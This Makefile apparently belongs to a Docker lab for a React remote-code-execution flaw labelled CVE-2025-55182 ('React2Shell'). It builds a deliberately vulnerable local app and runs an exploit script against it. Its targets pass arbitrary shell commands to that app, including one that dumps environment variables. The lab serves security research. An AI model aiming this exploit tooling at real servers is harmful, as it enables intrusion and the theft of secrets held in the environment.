# Makefile for CVE-2025-55182 Docker POC
# FOR SECURITY RESEARCH ONLY

.PHONY: help build start stop clean exploit dev logs shell test all

# Colors for output
RED=\033[0;31m
GREEN=\033[0;32m
BLUE=\033[0;34m
YELLOW=\033[1;33m
NC=\033[0m # No Color

# Default target
.DEFAULT_GOAL := help

help: ## Show this help message
	@echo "$(BLUE)========================================$(NC)"
	@echo "$(RED)CVE-2025-55182 (React2Shell) POC$(NC)"
	@echo "$(BLUE)========================================$(NC)"
	@echo ""
	@echo "Available targets:"
	@echo ""
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | awk 'BEGIN {FS = ":.*?## "}; {printf "  $(GREEN)%-15s$(NC) %s\n", $$1, $$2}'
	@echo ""
	@echo "Quick start: make all"
	@echo ""

build: ## Build all Docker images
	@echo "$(BLUE)[*] Building Docker images...$(NC)"
	@./docker-build.sh

start: ## Start vulnerable application with docker-compose
	@echo "$(BLUE)[*] Starting vulnerable application...$(NC)"
	@docker-compose up -d vulnerable-app
	@echo "$(GREEN)[+] Application started at http://localhost:3000$(NC)"

stop: ## Stop all containers
	@echo "$(BLUE)[*] Stopping containers...$(NC)"
	@docker-compose down
	@echo "$(GREEN)[+] Containers stopped$(NC)"

clean: ## Remove all containers, images, and volumes
	@echo "$(YELLOW)[!] Cleaning up all Docker resources...$(NC)"
	@docker-compose down -v
	@docker stop react2shell-vulnerable 2>/dev/null || true
	@docker rm react2shell-vulnerable 2>/dev/null || true
	@docker rmi react2shell-vulnerable react2shell-dev react2shell-exploit 2>/dev/null || true
	@echo "$(GREEN)[+] Cleanup complete$(NC)"

exploit: ## Run exploit against vulnerable app (use CMD="command" to customize)
	@echo "$(BLUE)[*] Running exploit...$(NC)"
	@docker-compose run --rm exploit python3 exploit.py -t http://vulnerable-app:3000 -c "$(or $(CMD),id)"

exploit-check: ## Check if target is vulnerable
	@echo "$(BLUE)[*] Checking vulnerability...$(NC)"
	@docker-compose run --rm exploit python3 exploit.py -t http://vulnerable-app:3000 --check-only

dev: ## Start development environment with hot reload
	@echo "$(BLUE)[*] Starting development environment...$(NC)"
	@docker-compose --profile dev up -d
	@echo "$(GREEN)[+] Dev environment started at http://localhost:3001$(NC)"

logs: ## Show logs from all services
	@docker-compose logs -f

logs-app: ## Show logs from vulnerable app only
	@docker-compose logs -f vulnerable-app

shell: ## Get shell in vulnerable app container
	@docker-compose exec vulnerable-app sh

shell-exploit: ## Get shell in exploit container
	@docker-compose run --rm exploit /bin/bash

test: ## Run automated exploit tests
	@echo "$(BLUE)[*] Running automated tests...$(NC)"
	@docker-compose run --rm exploit /bin/bash -c "./test-exploit.sh || exit 0"

ps: ## Show running containers
	@docker-compose ps

inspect: ## Inspect vulnerable app container
	@docker inspect react2shell-vulnerable || echo "Container not running"

network: ## Show network configuration
	@docker network inspect hello-world-next-js_research-net 2>/dev/null || echo "Network not created yet"

all: build start ## Build and start everything
	@echo ""
	@echo "$(GREEN)========================================$(NC)"
	@echo "$(GREEN)✓ Environment ready!$(NC)"
	@echo "$(GREEN)========================================$(NC)"
	@echo ""
	@echo "Vulnerable app: $(BLUE)http://localhost:3000$(NC)"
	@echo ""
	@echo "Run exploit with:"
	@echo "  $(YELLOW)make exploit$(NC)"
	@echo "  $(YELLOW)make exploit CMD=\"whoami\"$(NC)"
	@echo ""
	@echo "View logs:"
	@echo "  $(YELLOW)make logs$(NC)"
	@echo ""

demo: all ## Full demo: build, start, and run exploit
	@echo ""
	@echo "$(BLUE)[*] Waiting for app to be ready...$(NC)"
	@sleep 5
	@echo ""
	@echo "$(BLUE)[*] Running demonstration exploit...$(NC)"
	@echo ""
	@make exploit CMD="id"
	@echo ""
	@echo "$(GREEN)[+] Demo complete! Check logs with: make logs$(NC)"

# Docker-specific targets
docker-prune: ## Clean up unused Docker resources
	@echo "$(YELLOW)[!] Pruning Docker system...$(NC)"
	@docker system prune -f
	@docker volume prune -f
	@docker network prune -f
	@echo "$(GREEN)[+] Prune complete$(NC)"

docker-stats: ## Show Docker container stats
	@docker stats --no-stream

rebuild: clean build ## Clean and rebuild all images
	@echo "$(GREEN)[+] Rebuild complete$(NC)"

restart: stop start ## Restart all services
	@echo "$(GREEN)[+] Services restarted$(NC)"

# Development targets
watch: ## Watch logs in real-time
	@docker-compose logs -f --tail=100

health: ## Check health of vulnerable app
	@curl -f http://localhost:3000 && echo "$(GREEN)[+] App is healthy$(NC)" || echo "$(RED)[-] App is not responding$(NC)"

# Exploit variations
exploit-whoami: ## Run whoami command
	@make exploit CMD="whoami"

exploit-env: ## Show environment variables
	@make exploit CMD="env"

exploit-ls: ## List application files
	@make exploit CMD="ls -la /app"

exploit-pwd: ## Show current directory
	@make exploit CMD="pwd"

exploit-uname: ## Show system information
	@make exploit CMD="uname -a"

# Documentation
docs: ## Open documentation
	@echo "Documentation files:"
	@echo "  - README.md: Main documentation"
	@echo "  - DOCKER.md: Docker-specific guide"
	@echo "  - exploit.py: Exploit script"
